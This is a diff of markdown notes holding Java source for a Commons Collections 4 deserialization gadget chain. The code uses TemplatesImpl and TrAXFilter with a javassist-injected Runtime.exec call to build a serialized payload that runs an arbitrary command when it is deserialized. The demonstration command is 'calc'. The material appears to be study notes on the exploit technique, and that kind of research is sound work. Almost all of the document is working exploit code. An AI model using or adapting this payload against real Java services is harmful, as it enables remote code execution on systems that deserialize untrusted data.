@@ -8,30 +8,44 @@ PayLoad:
 
 ```java
 import com.nqzero.permit.Permit;
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-import javassist.ClassClassPath;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import javassist.ClassPool;
 import javassist.CtClass;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
-import org.apache.commons.collections4.functors.InvokerTransformer;
-import java.io.*;
-import java.lang.reflect.Field;
+
+import javax.xml.transform.Templates;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.*;
+import java.util.Map;
 import java.util.PriorityQueue;
+
 import static sun.reflect.misc.FieldUtil.getField;
-public class CommonCollection2Payload {
-//    通过javassist动态创建类的时候需要用到这个类
-    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
-        private static final long serialVersionUID = -5971610431559700674L;
-        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
-        @Override
-        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+
+public class CommonsCollections4 {
+    static String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
+    //getInvocationHandler用于获取名为handler的InvocationHandler实例，并将map传入成员变量memberValues
+    public static InvocationHandler getInvocationHandler(String handler, Map<String, Object> map) throws Exception {
+        //获取构造函数
+        final Constructor<?> ctor = Class.forName(handler).getDeclaredConstructors()[0];
+        //获取handler的私有成员的访问权限，否则会报 can not access a member of class sun.reflect.annotation.AnnotationInvocationHandler
+        Permit.setAccessible(ctor);
+        //实例化
+        return (InvocationHandler) ctor.newInstance(Override.class, map);
     }
-// 设置成员变量值
+    //createMyproxy用于返回handler为ih，代理接口为iface的动态代理对象
+    public static <T> T createMyproxy(InvocationHandler ih, Class<T> iface) {
+        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, 1);
+        allIfaces[0] = iface;
+        return iface.cast(Proxy.newProxyInstance(CommonsCollections1.class.getClassLoader(), allIfaces, ih));
+    }
+    // 设置成员变量值
     public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
         Field field = null;
         try {
@@ -46,7 +60,7 @@ public class CommonCollection2Payload {
         }
         field.set(obj, value);
     }
-//  获取成员变量值得
+    //  获取成员变量值得
     public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
         Field field = null;
         try {
@@ -59,12 +73,12 @@ public class CommonCollection2Payload {
         }
         return field.get(obj);
     }
-//  7u21反序列化漏洞恶意类生成函数
+    //  7u21反序列化漏洞恶意类生成函数
     public static Object createTemplatesImpl(String command) throws Exception{
         Object templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").newInstance();
         // use template gadget class
         ClassPool pool = ClassPool.getDefault();
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+        final CtClass clazz = pool.get(CommonsCollections2.StubTransletPayload.class.getName());
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                 command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                 "\");";
@@ -77,9 +91,9 @@ public class CommonCollection2Payload {
         setFieldValue(templates, "_name", "Pwnr");
         setFieldValue(templates, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
         return templates;
-    } 
- public static void main(String[] args) throws Exception {
-        String command = "open /Applications/Calculator.app/";
+    }
+    public static void main(String[] args) throws Exception {
+        String command = "calc";
         Object templates = createTemplatesImpl(command);
         ConstantTransformer constant = new ConstantTransformer(String.class);
         Class[] paramTypes = new Class[] { String.class };
@@ -105,6 +119,8 @@ public class CommonCollection2Payload {
         Object newObj = ois.readObject();
         ois.close();
     }
+}
+
 ```
 
 
